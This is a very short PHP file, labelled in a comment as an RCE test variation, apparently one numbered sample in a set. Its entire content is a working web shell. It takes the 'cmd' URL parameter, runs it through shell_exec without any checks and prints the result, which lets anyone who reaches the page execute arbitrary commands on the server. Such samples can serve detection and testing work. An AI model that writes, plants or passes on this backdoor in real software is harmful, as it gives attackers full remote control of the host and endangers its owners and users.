<?php
// RCE test variation #1164
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>